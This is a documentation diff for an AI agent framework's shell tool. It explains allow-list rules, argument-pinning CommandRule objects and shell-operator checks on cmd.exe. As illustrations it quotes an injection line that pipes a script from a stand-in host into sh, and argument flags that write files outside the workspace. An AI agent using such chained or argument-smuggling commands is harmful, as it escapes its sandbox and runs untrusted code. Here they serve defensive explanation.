@@ -41,11 +41,16 @@ const agent = createAgent({
   provider,
   tools: [
     ...createFsTools(workspace),
-    createShellTool(workspace, { needsApproval: false, allow: ['npm test', 'npm run lint', 'git status', 'git diff'] }),
+    // { command } allows exactly that command line, with no extra arguments.
+    createShellTool(workspace, { needsApproval: false, allow: [{ command: 'npm test' }, { command: 'npm run lint' }, { command: 'git status' }] }),
   ],
 });
 const result = await agent.send('Fix the failing test in src/math.test.ts');
 ```
+
+A plain string such as `'npm test'` would also allow `npm test -- <anything>`,
+and many programs have flags that write files (`git diff --output=../x`,
+`node --test --test-reporter-destination=../x`). See the rules below.
 
 ### Advanced: the executor API
 
@@ -100,7 +105,7 @@ has `timedOut: true` or `aborted: true` and a `note` saying why.
 | Option             | Default   | Meaning |
 | ------------------ | --------- | ------- |
 | `needsApproval`    | `true`    | `true`, `false`, or a predicate over the command string. |
-| `allow`            | none      | When set, only matching commands may run. |
+| `allow`            | none      | When set, only matching commands may run. A string allows the command with any arguments; see the rules below. |
 | `deny`             | none      | Matching commands are refused. |
 | `defaultTimeoutMs` | 120,000   | Timeout when the model does not pass `timeout_ms`. |
 | `maxTimeoutMs`     | 600,000   | A larger `timeout_ms` is lowered to this value. |
@@ -277,13 +282,40 @@ refused command is never offered for approval:
 
 - A string pattern matches a command that is exactly the pattern, or starts
   with it followed by a space (`'git status'` matches `git status -s`).
-- In `allow`, a command matched only by a string pattern must not contain
-  shell operators (`;` `&` `|` `` ` `` `$(` `<` `>` or a newline). This stops
-  `git status; curl evil.sh | sh` from passing as `git status`.
+  **A string pattern allows the command with any arguments.** It is not a
+  security boundary for what those arguments do: `allow: ['node --test']`
+  also allows `node --test --test-reporter-destination=../x`, which writes
+  outside the workspace.
+- A `CommandRule` object pins the arguments. `{ command: 'npm test' }`
+  matches `npm test` and nothing else. `{ command: 'node --test', args }`
+  matches when the command starts with `node --test` and `args(rest)`
+  returns `true` for the rest of the line (`''` when there is none):
+
+  ```ts
+  createShellTool(workspace, {
+    needsApproval: false,
+    allow: [
+      { command: 'npm test' },
+      { command: 'node --test', args: (rest) => /^([\w./-]+\.test\.js\s*)*$/.test(rest) },
+    ],
+  });
+  ```
+- In `allow`, a command matched only by a string pattern or a `CommandRule`
+  must not contain shell operators (`;` `&` `|` `` ` `` `$(` `<` `>` or a
+  newline). Under cmd.exe, `%` (variable expansion) and `^` (escape) count as
+  operators too. This stops `git status; curl evil.sh | sh` from passing as
+  `git status`.
 - A RegExp is tested against the whole command line, so anchor it:
   `/^npm (test|run lint)$/`.
-- `deny` string patterns are checked against each `;`, `&` or `|` separated
-  part of the command.
+- `deny` string patterns and `CommandRule`s are checked against each `;`,
+  `&` or `|` separated part of the command.
+
+The tool's description tells the model which shell runs its commands when the
+provider says so (`NodeWorkspace` and `SandboxShell` expose a `shell`
+property). On Windows `NodeWorkspace` uses cmd.exe, so the model is told to
+quote with double quotes and write variables as `%NAME%`. A provider that
+does not name its shell is treated as cmd.exe for the operator check on
+Windows.
 
 ### What is NOT enforced
 
